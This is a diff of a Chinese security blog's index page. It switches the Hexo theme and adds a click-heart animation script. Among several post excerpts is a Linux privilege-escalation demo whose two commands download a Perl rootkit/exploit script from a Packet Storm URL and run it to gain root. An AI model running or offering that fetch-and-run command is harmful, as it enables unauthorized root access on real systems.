@@ -1,252 +1,323 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
-  <head>
+
+
+<head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <meta name="description" content="迷失在信息安全圈的有志青年">
-  <meta name="keywords" content="为人民服务,网络安全,村夫,渗透测试,黑客技术,IT网站,程序员,编程,python">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-    <link rel="icon" href="">
   
+    <meta name="keywords" content="为人民服务,网络安全,村夫,渗透测试,黑客技术,IT网站,程序员,编程,python" />
+  
+
+  
+    <meta name="description" content="为人民服务赚点钱" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/logo.png">
+  <title> [ 为人民服务 ]为人民服务</title>
+  
+    <!-- stylesheets list from config.yml -->
     
-  <title>Fefree</title>
-  <link rel="stylesheet" href="/style.css">
-  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
-  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/microb.css">
+    
+  
 </head>
 
 <body>
-  <header>
-  <div class="header-container">
-    <a class='logo' href="/">
-      <span>Fefree</span>
-    </a>
-    <ul class="right-header">
-      
-        <li class="nav-item">
-          
-            <a href="/" class="item-link active">首页</a>
-          
-        </li>
-      
-        <li class="nav-item">
-          
-            <a href="/about" class="item-link">关于</a>
-          
-        </li>
-      
-        <li class="nav-item">
-          
-            <a href="/archives" class="item-link">归档</a>
-          
-        </li>
-      
-        <li class="nav-item">
-          
-            <a href="/tags" class="item-link">标签</a>
-          
-        </li>
-      
-        <li class="nav-item">
-          
-            <a href="/links" class="item-link">朋友</a>
-          
-        </li>
-      
-    </ul>
-  </div>
-</header>
-
-  <main id='index'>
-  <div class="posts-list">
+  <nav class="home-menu pure-menu pure-menu-horizontal pure-menu-fixed">
+  <ul class="pure-menu-list float-r clearfix">
     
-      <section>
-        <a href="/2016/12/20/Linux多版本自动提权脚本/">
-          <h3 class='post-head'>
-            Linux多版本自动提权脚本
-          </h3>
+      <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+        <a id="menu-main" class="pure-menu-link" href="javascript:;">
+          <img class="menu-icon" src="/logo.png" alt="MENU">
         </a>
+        <ul class="pure-menu-children">
         
-        <div class="post-content">
           
+            <li class="pure-menu-item actived"><a href="/" class="pure-menu-link">首页</a></li>
+            
+          
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">标签</a></li>
+            
+          
+          
+            <li class="pure-menu-item"><a href="/search" class="pure-menu-link">搜索</a></li>
+            
+          
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      </ul>
+      </li>
+    
+  </ul>  
+  <a class="pure-menu-heading" href="/">
+      <h1 class="title">为人民服务</h1>
+      <!-- <span>为人民服务</span> -->
+  </a>
+  <!--  -->
+</nav>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      
+
+
+  <div class="recent-posts">
+    
+      <article class="recent-post-item">
+        <a class="title" href="/2016/12/20/Linux多版本自动提权脚本/"><h2>Linux多版本自动提权脚本</h2></a>
+        
+          <div class="post-excerpt">
             <h2 id="使用demo"><a href="#使用demo" class="headerlink" title="使用demo"></a>使用demo</h2><pre><code>wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/var.txt -O root.pl
 perl root.pl
 </code></pre><p>选择对应的版本即可爆菊</p>
-          
-        </div>
-        <div class='post-meta'>
-          <i class="fa fa-calendar" aria-hidden="true"></i> <time>2016年12月20日</time>
-          
-          
-            <span class="seperator">|</span>
-             
-                <i class="fa fa-tag" aria-hidden="true"></i>
-              
-             
-  <a href="/tags/#Linux" class='tag'>Linux</a>
-
-
-          
-        </div>
-      </section>
-    
-      <section>
-        <a href="/2016/12/19/Docker——在docker上安装NESSUS扫描器/">
-          <h3 class='post-head'>
-            Docker——在docker上安装NESSUS扫描器
-          </h3>
-        </a>
+          </div>
         
-        <div class="post-content">
+        
+        <div class="post-footer">
           
+            <ul class="index-tag-list"><li class="index-tag-list-item"><a class="index-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
+          
+
+          
+            <time class="time pr" datetime="2016-12-20T06:12:32.000Z">
+              2016-12-20
+            </time>
+          
+        </div>
+      </article>
+    
+      <article class="recent-post-item">
+        <a class="title" href="/2016/12/19/Docker——在docker上安装NESSUS扫描器/"><h2>Docker——在docker上安装NESSUS扫描器</h2></a>
+        
+          <div class="post-excerpt">
             <blockquote>
 <p>搭建自己的武器库<br>咱们先讲讲如何搭建自己的武器库，不管你是做开发，渗透，还是其他工作，都需要有自己常用和顺手的工具，但是很多时候，鱼和熊掌不可兼得，比如在windows下不能同时安装天境和NESSUS，很多工具我们需要借助虚拟机来完成。不过在你学过docker以后，你会发现，其实这都不是事。本文是讲述一下如何在Ubuntu/kali下安装DOCKER版nessus扫描器。</p>
 </blockquote>
-          
-        </div>
-        <div class='post-meta'>
-          <i class="fa fa-calendar" aria-hidden="true"></i> <time>2016年12月19日</time>
-          
-            | <i class="fa fa-folder-open-o" aria-hidden="true"></i> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/工具推荐/">工具推荐</a>
-  </div>
-
-
-
-          
-          
-            <span class="seperator">|</span>
-             
-                <i class="fa fa-tag" aria-hidden="true"></i>
-              
-             
-  <a href="/tags/#武器" class='tag'>武器</a>
-
-
-          
-        </div>
-      </section>
-    
-      <section>
-        <a href="/2016/12/16/一款你值得用的快速启动工具/">
-          <h3 class='post-head'>
-            一款你值得用的快速启动工具
-          </h3>
-        </a>
+          </div>
         
-        <div class="post-content">
+        
+        <div class="post-footer">
           
+            <ul class="index-tag-list"><li class="index-tag-list-item"><a class="index-tag-list-link" href="/tags/武器/">武器</a></li></ul>
+          
+
+          
+            <time class="time pr" datetime="2016-12-19T06:09:55.000Z">
+              2016-12-19
+            </time>
+          
+        </div>
+      </article>
+    
+      <article class="recent-post-item">
+        <a class="title" href="/2016/12/16/一款你值得用的快速启动工具/"><h2>一款你值得用的快速启动工具</h2></a>
+        
+          <div class="post-excerpt">
             <blockquote>
 <p>提升工作效率—你得需要一款快启工具</p>
 </blockquote>
 <p>能看到这篇文章的朋友，大都该是从事IT方向的，而程序员的利器除了你脑子里的思维，还有手里的电脑。</p>
-          
-        </div>
-        <div class='post-meta'>
-          <i class="fa fa-calendar" aria-hidden="true"></i> <time>2016年12月16日</time>
-          
-            | <i class="fa fa-folder-open-o" aria-hidden="true"></i> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/工具推荐/">工具推荐</a>
-  </div>
-
-
-
-          
-          
-            <span class="seperator">|</span>
-             
-                <i class="fa fa-tag" aria-hidden="true"></i>
-              
-             
-  <a href="/tags/#武器" class='tag'>武器</a>
-
-
-          
-        </div>
-      </section>
-    
-      <section>
-        <a href="/2016/11/23/一切-重新开始/">
-          <h3 class='post-head'>
-            一切,重新开始
-          </h3>
-        </a>
+          </div>
         
-        <div class="post-content">
+        
+        <div class="post-footer">
           
+            <ul class="index-tag-list"><li class="index-tag-list-item"><a class="index-tag-list-link" href="/tags/武器/">武器</a></li></ul>
+          
+
+          
+            <time class="time pr" datetime="2016-12-16T04:58:38.000Z">
+              2016-12-16
+            </time>
+          
+        </div>
+      </article>
+    
+      <article class="recent-post-item">
+        <a class="title" href="/2016/11/23/一切-重新开始/"><h2>一切,重新开始</h2></a>
+        
+          <div class="post-excerpt">
             <blockquote>
 <p>博客数据丢失了，不过也好，以前写的那么烂的东西丢了就丢了吧,也不可惜！！以后的文章我会用心去写。</p>
 </blockquote>
+          </div>
+        
+        
+        <div class="post-footer">
+          
+            <ul class="index-tag-list"><li class="index-tag-list-item"><a class="index-tag-list-link" href="/tags/实习/">实习</a></li></ul>
+          
+
+          
+            <time class="time pr" datetime="2016-11-23T13:55:11.000Z">
+              2016-11-23
+            </time>
           
         </div>
-        <div class='post-meta'>
-          <i class="fa fa-calendar" aria-hidden="true"></i> <time>2016年11月23日</time>
-          
-            | <i class="fa fa-folder-open-o" aria-hidden="true"></i> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/随笔/">随笔</a>
-  </div>
-
-
-
-          
-          
-            <span class="seperator">|</span>
-             
-                <i class="fa fa-tag" aria-hidden="true"></i>
-              
-             
-  <a href="/tags/#实习" class='tag'>实习</a>
-
-
-          
-        </div>
-      </section>
+      </article>
     
   </div>
-  <aside>
-    
-    
-    
-      <div class="categories">
-        <h1>
-          文章分类
-        </h1>
-        <div class="content">
-          <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/修复方案/">修复方案</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/博客搭建/">博客搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具推荐/">工具推荐</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具脚本/">工具脚本</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术交流/">技术交流</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统推荐/">系统推荐</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul>
-        </div>
-      </div>
-    
-    
-  </aside>
-</main>
 
-  <div class="paging">
-  <div class="paging-container">
-    
-    <div class='page-prev'>
-      <a href="/">上一页</a>
+
+
     </div>
+
     
+      <nav class="page-nav text-center">
+          <a class="extend prev" rel="prev" href="/">&lt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+      </nav>
     
+
   </div>
-</div>
 
-
-
-  <footer>
-  <div class="copyright">
-    <div>
-      &copy; 2018 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+      <a href="http://blog.meiqiu.me" target="_blank">为人民服务</a> |
+      <a href="http://meiqiu.me" target="_blank">主站</a> |
+      <a href="https://xiao.meiqiu.me" target="_blank">小煤球</a> |
+      <a href="https://github.com/microacup" target="_blank">GitHub</a> |
+      <a href="http://hexo.io" target="_blank">Hexo</a> |
+      <a href="https://github.com/microacup/hexo-theme-micorb" target="_blank">Theme microb</a>
     </div>
-    <div>
-      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
-    </div>
-  </div>
-</footer>
+  </footer>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
 
 
 
